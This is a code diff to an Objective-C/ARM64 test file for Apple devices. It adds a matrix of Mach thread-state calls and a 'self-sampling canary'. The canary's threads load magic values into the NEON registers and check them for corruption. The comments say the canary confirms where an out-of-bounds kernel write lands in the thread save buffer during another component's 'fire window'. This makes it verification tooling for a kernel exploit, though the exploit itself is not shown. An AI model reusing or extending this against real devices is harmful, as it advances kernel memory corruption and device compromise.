@@ -51,7 +51,24 @@
 #import <string.h>
 #import <unistd.h>
 
-#define P062_BUILD @"p062-neon-selftest-v3-reply"
+#define P062_BUILD @"p062-neon-selftest-v4-selfsample"
+/* v4 (2026-11-22): TWO additions.
+   (1) PHASE A — the RPC matrix: the 1540 READ FAIL receipts (P044 witnesses,
+       kr=0x90000003 = suspend MIG_BAD_ARGUMENTS 0x10000003 on EVERY scan) and
+       the P1 state-reply failure (same 0x10000003) get a diagnosis matrix:
+       suspend vs get_state vs task_threads-issued ports vs pthread ports,
+       flavors x counts, running vs suspended. Find ANY working external read
+       or close the RPC family honestly.
+   (2) PHASE B — THE SELF-SAMPLING CANARY: the readback that needs NO kernel
+       RPC (the 26.5 receipts: the exception path carries the state — P1 PASS
+       64/64 — but the thread dies on the failed reply; the RPC family is
+       rejected). The worker samples ITS OWN registers: ld1 magic -> ALU spin
+       (the preemption window: the kernel saves/restores the NEON state
+       through the thread-zone save buffer) -> stp q0..q31 to a sample buffer
+       -> userspace diff vs canonical. A write into the save buffer between
+       the save and the restore lands corrupted magic in the live regs — the
+       stp catches it before the next ld1 reload erases it. This is the
+       deterministic NEON canary readback. */
 
 /* 32 NEON 128-bit registers = 64 qwords. COUNT is 132 (528/4), not 64. */
 #define P062_NEON_QWORDS 64
@@ -467,6 +484,201 @@ static void p062_phase2(void)
     pthread_join(th, NULL);
 }
 
+/* ─────────────────── v4 PHASE A: the RPC matrix ───────────────────
+   The 1540 P044 READ-FAIL receipts + the P1 reply failure: the whole
+   thread-state RPC family returned MIG_BAD_ARGUMENTS (0x10000003) on 23F77.
+   This matrix isolates WHERE: suspend vs get, running vs suspended,
+   pthread-issued vs task_threads-issued ports, flavor x count variants. */
+static void p062_phaseA(void)
+{
+    p062_log(@"");
+    p062_log(@"=== PHASE A: the thread-state RPC matrix (the 0x10000003 hunt) ===");
+
+    pthread_t th;
+    g_p2_quit = 0; g_p2_worker_ready = 0; g_p2_observedV0 = 0;
+    if (pthread_create(&th, NULL, p062_p2_worker_fn, NULL) != 0) {
+        p062_log(@"[A] pthread_create failed"); return;
+    }
+    for (int i = 0; i < 100 && !g_p2_worker_ready; i++) usleep(1000);
+
+    thread_act_t pp = pthread_mach_thread_np(th);
+    arm_neon_state64_t st;
+    mach_msg_type_number_t cnt;
+
+    /* A1: suspend alone (the P044 receipts: 0x10000003 here) */
+    kern_return_t k1 = thread_suspend(pp);
+    p062_log(@"[A1] thread_suspend(pthread port) kr=0x%x %s", k1,
+             k1 == KERN_SUCCESS ? "(the P044 wall did NOT reproduce — big)" :
+             "(the wall reproduces — see A5 for the port-class variant)");
+
+    /* A2: get on the SUSPENDED thread (only if A1 worked) */
+    if (k1 == KERN_SUCCESS) {
+        cnt = ARM_NEON_STATE64_COUNT;
+        kern_return_t k2 = thread_get_state(pp, ARM_NEON_STATE64,
+                                            (thread_state_t)&st, &cnt);
+        p062_log(@"[A2] get(NEON,suspended) kr=0x%x cnt=%u", k2, cnt);
+        cnt = 68;
+        kern_return_t k3 = thread_get_state(pp, ARM_THREAD_STATE64,
+                                            (thread_state_t)&st, &cnt);
+        p062_log(@"[A3] get(THREAD64,suspended) kr=0x%x cnt=%u", k3, cnt);
+        thread_resume(pp);
+    }
+
+    /* A4: get on a RUNNING thread (no suspend) */
+    cnt = ARM_NEON_STATE64_COUNT;
+    kern_return_t k4 = thread_get_state(pp, ARM_NEON_STATE64,
+                                        (thread_state_t)&st, &cnt);
+    p062_log(@"[A4] get(NEON,running,no-suspend) kr=0x%x cnt=%u", k4, cnt);
+
+    /* A5: the port CLASS variant — task_threads()-issued ports carry a
+       different right provenance than pthread_mach_thread_np. If the app
+       can call task_threads at all, try suspend+get on THOSE. */
+    {
+        thread_act_array_t ths = NULL; mach_msg_type_number_t n = 0;
+        kern_return_t kt = task_threads(mach_task_self(), &ths, &n);
+        p062_log(@"[A5] task_threads kr=0x%x n=%u", kt, n);
+        if (kt == KERN_SUCCESS && n > 0) {
+            kern_return_t ks = thread_suspend(ths[0]);
+            cnt = ARM_NEON_STATE64_COUNT;
+            kern_return_t kg = (ks == KERN_SUCCESS)
+                ? thread_get_state(ths[0], ARM_NEON_STATE64,
+                                   (thread_state_t)&st, &cnt) : ks;
+            p062_log(@"[A5] suspend(task-issued[0]) kr=0x%x get kr=0x%x cnt=%u",
+                     ks, kg, cnt);
+            if (ks == KERN_SUCCESS) thread_resume(ths[0]);
+            for (mach_msg_type_number_t i = 0; i < n; i++)
+                mach_port_deallocate(mach_task_self(), ths[i]);
+            vm_deallocate(mach_task_self(), (vm_address_t)ths,
+                          n * sizeof(thread_act_t));
+        }
+    }
+
+    g_p2_quit = 1; pthread_join(th, NULL);
+    p062_log(@"[A] matrix done — any KERN_SUCCESS row above = a live external "
+             @"read path (feed it to the P044 witnesses); all 0x10000003 = "
+             @"the RPC family is closed on this build (the self-sampling "
+             @"canary is the readback).");
+}
+
+/* ─────────────── v4 PHASE B: the self-sampling canary ───────────────
+   NO kernel RPC. The worker: ld1 the canonical magic -> ALU spin (the
+   preemption window: the kernel saves/restores through the thread-zone
+   NEON save buffer) -> stp its OWN q0..q31 to a sample buffer -> diff.
+   A write into the save buffer between save and restore loads corrupted
+   magic into the live regs — the stp catches it before the next ld1. */
+#define P062_CANARY_N 8
+typedef struct {
+    uint64_t magic[64]  __attribute__((aligned(16)));
+    uint64_t sample[64] __attribute__((aligned(16)));
+    volatile uint64_t iters, diffs;
+    volatile int ready, quit;
+    pthread_t th;
+} p062_can_t;
+static p062_can_t g_can[P062_CANARY_N];
+
+static void *p062_canary_fn(void *arg)
+{
+    p062_can_t *c = (p062_can_t *)arg;
+    int wid = (int)(c - g_can);
+    for (int q = 0; q < 64; q++)
+        c->magic[q] = 0x4e45000000000000ULL | ((uint64_t)wid << 32) | (uint64_t)q;
+    c->ready = 1;
+    while (!c->quit) {
+        __asm__ volatile(
+            "ld1 {v0.2d, v1.2d, v2.2d, v3.2d}, [%0], #64    \n"
+            "ld1 {v4.2d, v5.2d, v6.2d, v7.2d}, [%0], #64    \n"
+            "ld1 {v8.2d, v9.2d, v10.2d, v11.2d}, [%0], #64  \n"
+            "ld1 {v12.2d, v13.2d, v14.2d, v15.2d}, [%0], #64\n"
+            "ld1 {v16.2d, v17.2d, v18.2d, v19.2d}, [%0], #64\n"
+            "ld1 {v20.2d, v21.2d, v22.2d, v23.2d}, [%0], #64\n"
+            "ld1 {v24.2d, v25.2d, v26.2d, v27.2d}, [%0], #64\n"
+            "ld1 {v28.2d, v29.2d, v30.2d, v31.2d}, [%0]     \n"
+            :
+            : "r"(c->magic)
+            : "v0","v1","v2","v3","v4","v5","v6","v7","v8","v9","v10","v11",
+              "v12","v13","v14","v15","v16","v17","v18","v19","v20","v21",
+              "v22","v23","v24","v25","v26","v27","v28","v29","v30","v31",
+              "memory");
+        /* the preemption window: pure-ALU spin (NEON stays loaded) */
+        for (volatile int s = 0; s < 4000; s++)
+            __asm__ volatile("nop");
+        /* SELF-SAMPLE before the next ld1 erases any restored corruption */
+        __asm__ volatile(
+            "stp q0, q1, [%0, #0]\n"
+            "stp q2, q3, [%0, #32]\n"
+            "stp q4, q5, [%0, #64]\n"
+            "stp q6, q7, [%0, #96]\n"
+            "stp q8, q9, [%0, #128]\n"
+            "stp q10, q11, [%0, #160]\n"
+            "stp q12, q13, [%0, #192]\n"
+            "stp q14, q15, [%0, #224]\n"
+            "stp q16, q17, [%0, #256]\n"
+            "stp q18, q19, [%0, #288]\n"
+            "stp q20, q21, [%0, #320]\n"
+            "stp q22, q23, [%0, #352]\n"
+            "stp q24, q25, [%0, #384]\n"
+            "stp q26, q27, [%0, #416]\n"
+            "stp q28, q29, [%0, #448]\n"
+            "stp q30, q31, [%0, #480]\n"
+            :
+            : "r"(c->sample)
+            : "memory");
+        c->iters++;
+        for (int q = 0; q < 64; q++) {
+            if (c->sample[q] != c->magic[q]) {
+                c->diffs++;
+                /* the receipt row — print from the worker (bounded) */
+                if (c->diffs <= 8)
+                    p062_log(@"[B] CANARY HIT wid=%d qword=%d "
+                             @"was=0x%016llx now=0x%016llx",
+                             wid, q,
+                             (unsigned long long)c->magic[q],
+                             (unsigned long long)c->sample[q]);
+                break;
+            }
+        }
+    }
+    return NULL;
+}
+
+static void p062_phaseB(void)
+{
+    p062_log(@"");
+    p062_log(@"=== PHASE B: the self-sampling canary (no kernel RPC) ===");
+    memset(g_can, 0, sizeof(g_can));
+    int started = 0;
+    for (int i = 0; i < P062_CANARY_N; i++) {
+        g_can[i].quit = 0;
+        if (pthread_create(&g_can[i].th, NULL, p062_canary_fn, &g_can[i]) == 0)
+            started++;
+    }
+    for (int i = 0; i < 200; i++) {
+        int rdy = 0;
+        for (int j = 0; j < P062_CANARY_N; j++) if (g_can[j].ready) rdy++;
+        if (rdy == started) break;
+        usleep(1000);
+    }
+    p062_log(@"[B] %d/%d canaries live — 5 s window", started, P062_CANARY_N);
+    usleep(5000000);
+    uint64_t it = 0, df = 0;
+    for (int i = 0; i < P062_CANARY_N; i++) {
+        g_can[i].quit = 1;
+        it += g_can[i].iters; df += g_can[i].diffs;
+    }
+    for (int i = 0; i < P062_CANARY_N; i++)
+        if (g_can[i].th) pthread_join(g_can[i].th, NULL);
+    p062_log(@"[B] iters=%llu diffs=%llu — the channel receipt: %@",
+             (unsigned long long)it, (unsigned long long)df,
+             it > 0 ? @"LIVE (the self-sample diff machinery works; diffs=0 "
+                      @"on a clean system = the canary is ready to embed in "
+                      @"P044's fire window)" :
+                     @"DEAD (no iterations — check the asm constraints)");
+    p062_log(@"[B] NOTE: a CANARY HIT row = a restored NEON state that "
+             @"differs from the canonical — on a clean system that is a "
+             @"kernel save/restore anomaly; inside P044's fire window it is "
+             @"the OOB write's landing receipt (the thread-zone save buffer).");
+}
+
 /* ─────────────────────────── tap ─────────────────────────── */
 
 @implementation P062NEONSelfTest
@@ -566,6 +778,8 @@ static void p062_phase2(void)
         }
 
         p062_phase2();
+        p062_phaseA();
+        p062_phaseB();
 
         p062_log(@"");
         p062_log(@"=== VERDICT ===");
